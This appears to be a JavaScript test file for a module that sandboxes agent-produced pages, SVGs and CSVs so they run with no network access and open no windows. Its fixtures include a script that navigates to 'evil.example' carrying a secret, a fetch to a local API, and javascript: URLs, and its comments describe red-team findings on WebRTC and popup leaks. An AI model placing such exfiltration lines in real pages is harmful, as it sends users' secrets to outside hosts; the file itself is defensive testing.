// What a chat shows the owner (shownPages.js): a page runs with no network, a CSV reads as a table, and each item sits under
// the answer that made it (the owner, 2026-10-09: "only if the agent thinks it's a good way to understand things").
import test from "node:test";
import assert from "node:assert/strict";
import { CSP, csvRows, fitSvg, lockDown, outsideLink, placeShown, SANDBOX, shut } from "../src/shownPages.js";

// THE RED TEAM, 2026-11-24 (T8a): a published page navigated itself to evil/?d=SECRET with no click. Drawn inside a frame whose only rule is
// frame-src 'none', Chrome refuses that navigation and the page's own scripts still run (checked in one Chrome against a stand-in server)
test("a page is drawn inside a frame that lets it navigate nowhere, its own policy and sandbox kept", () => {
  const page = "<!doctype html><p>Q3</p><script>location.href='https://evil.example/?d=SECRET'</script>";
  const out = shut(page);
  assert.match(out, /^<!doctype html><meta http-equiv="Content-Security-Policy" content="frame-src 'none'">/);
  const inner = /<iframe sandbox="([^"]*)" srcdoc="([^"]*)"><\/iframe>$/.exec(out);
  assert.ok(inner, "one inner frame"); assert.equal(inner[1], SANDBOX); assert.doesNotMatch(SANDBOX, /allow-same-origin|allow-top-navigation/);
  assert.equal(inner[2].replace(/&quot;/g, '"').replace(/&amp;/g, "&"), lockDown(page), "the page itself, under its no-network policy");
});

// THE RED TEAM, ROUND 3: Chromium keeps no policy over WebRTC - a page's RTCPeerConnection reached a TURN server on 127.0.0.1 with no
// click - and an escaped popup was a fresh window to build one in, or an outside address carrying what the owner typed. Checked in one
// Chromium against stand-in servers on 127.0.0.1: before, the TURN stand-in and the popup's address were reached; after, neither, and a
// link the owner clicks opens through the app. Here: the frame opens no window, and the page's realm has no peer connection before its
// own first line runs
test("a page has no peer connection and no window of its own; what it asks to open goes to the app, http only", async () => {
  const { runInNewContext } = await import("node:vm");
  assert.doesNotMatch(SANDBOX, /allow-popups/);
  const out = lockDown("<!doctype html><script>page()</script>");
  const at = out.indexOf("<script>"), prelude = out.slice(at + 8, out.indexOf("</script>", at));
  assert.ok(at < out.indexOf("page()"), "the prelude runs before the page's own script");
  const sent = [], clicks = [];
  class Element { constructor(href) { this.href = href; } closest() { return this; } }
  const w = { RTCPeerConnection() {}, webkitRTCPeerConnection() {}, open() { return {}; }, URL, Element, document: { baseURI: "about:srcdoc" },
    parent: { postMessage: (m) => sent.push(m) }, addEventListener: (t, f) => clicks.push(f) };
  w.window = w;
  runInNewContext(prelude, w);
  assert.equal("RTCPeerConnection" in w, false); assert.equal("webkitRTCPeerConnection" in w, false);
  assert.equal(w.open("https://vendor.example/a"), null);
  w.open("javascript:alert(1)");
  const click = (href, isTrusted) => { const e = { target: new Element(href), isTrusted, prevented: false, preventDefault() { this.prevented = true; } }; clicks[0](e); return e.prevented; };
  assert.equal(click("https://vendor.example/b", true), true);
  assert.equal(click("https://vendor.example/c", false), true, "a click a script made opens nothing");
  assert.equal(click("about:srcdoc#totals", true), false, "a link within the page still scrolls");
  assert.deepEqual(JSON.parse(JSON.stringify(sent)), [{ tqOpen: "https://vendor.example/a" }, { tqOpen: "https://vendor.example/b" }]);
});

test("the app opens only what its own frame asked, a web address, on the owner's press, never its own address", () => {
  const frame = {}, ask = (tqOpen, source = frame) => ({ source, data: { tqOpen } }), own = "http://127.0.0.1:7787";
  assert.equal(outsideLink(ask("https://vendor.example/r"), frame, true, own), "https://vendor.example/r");
  assert.equal(outsideLink(ask("https://vendor.example/r"), frame, false, own), "", "no press just now");
  assert.equal(outsideLink(ask("https://vendor.example/r", {}), frame, true, own), "", "another window");
  assert.equal(outsideLink(ask("javascript:alert(1)"), frame, true, own), "");
  assert.equal(outsideLink(ask("http://127.0.0.1:7787/api/settings"), frame, true, own), "");
  assert.equal(outsideLink({ source: frame, data: "x" }, frame, true, own), "");
});

// A WIDE PICTURE FITS ITS FRAME (the stress test, 2026-11-02): a 1600-wide SVG drew at its own width and the preview scrolled sideways
test("an SVG previews at the frame's width: shrunk to fit, its height following, with no sideways scroll", () => {
  const out = fitSvg(`<?xml version="1.0"?>\n<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "x.dtd">\n<svg xmlns="http://www.w3.org/2000/svg" width="1600" height="400"><rect width="1600" height="400"/></svg>`);
  assert.match(out, /svg\s*\{[^}]*max-width:\s*100%[^}]*height:\s*auto/);
  assert.match(out, /overflow-x:\s*hidden/);
  assert.match(out, /<svg viewBox="0 0 1600 400"/, "a fixed size scales only with a viewBox");
  assert.doesNotMatch(out, /<\?xml|DTD SVG/i, "the file's own prolog is not the page's");
  assert.match(lockDown(out), /^<!doctype html><meta http-equiv="Content-Security-Policy"/i, "standards mode, and the no-network policy still first");
  assert.match(fitSvg(`<svg viewBox="0 0 10 5" width="1000px" height="500px"></svg>`), /<svg viewBox="0 0 10 5" width/, "its own viewBox is kept");
});

test("a page gets the no-network policy first, after its doctype so it keeps standards mode", () => {
  const out = lockDown("<!DOCTYPE html><html><head><script>fetch('http://127.0.0.1:7999/api/tasks')</script>");
  assert.match(out, /^<!DOCTYPE html><meta http-equiv="Content-Security-Policy"/);
  assert.match(lockDown("<div>hi</div>"), /^<meta http-equiv="Content-Security-Policy"[^>]*><script>[^<]*<\/script><div>hi<\/div>$/);
  assert.match(CSP, /connect-src 'none'/);
  assert.match(CSP, /form-action 'none'/);
  assert.doesNotMatch(CSP, /127\.0\.0\.1|localhost|connect-src [^;]*https/);
});

test("a CSV reads as rows, quotes and all", () => {
  assert.deepEqual(csvRows('Category,August\r\nSupplies,"$78,400"\n"Say ""hi""",1\n'),
    [["Category", "August"], ["Supplies", "$78,400"], ['Say "hi"', "1"]]);
});

// ...and nothing is pinned at the chat's foot (the owner, 2026-11-13): one no answer in the thread holds is not drawn in the chat at all
test("each item sits under the answer that made it; one whose answer is not in the thread is drawn nowhere in the chat", () => {
  const msgs = [{ id: "comment-1", role: "user" }, { id: "comment-2", role: "assistant" }];
  const got = placeShown([{ id: 7, after: "comment-2" }, { id: 8, after: "comment-9" }, { id: 9, after: null }], msgs);
  assert.deepEqual(got, { by: { "comment-2": [{ id: 7, after: "comment-2" }] } });
});
